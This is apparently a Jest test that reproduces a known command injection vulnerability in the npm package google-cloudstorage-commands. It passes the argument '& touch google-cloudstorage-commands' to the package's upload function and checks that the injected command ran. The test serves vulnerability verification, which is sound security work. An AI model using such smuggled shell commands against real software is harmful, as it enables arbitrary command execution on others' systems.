//https://snyk.io/vuln/SNYK-JS-GOOGLECLOUDSTORAGECOMMANDS-1050431
test("Command Injection in google-cloudstorage-commands", () => {
  var root = require("google-cloudstorage-commands");
  const fs = require("fs");
  const path = "./google-cloudstorage-commands";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  root.upload("./", "& touch google-cloudstorage-commands", true);

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
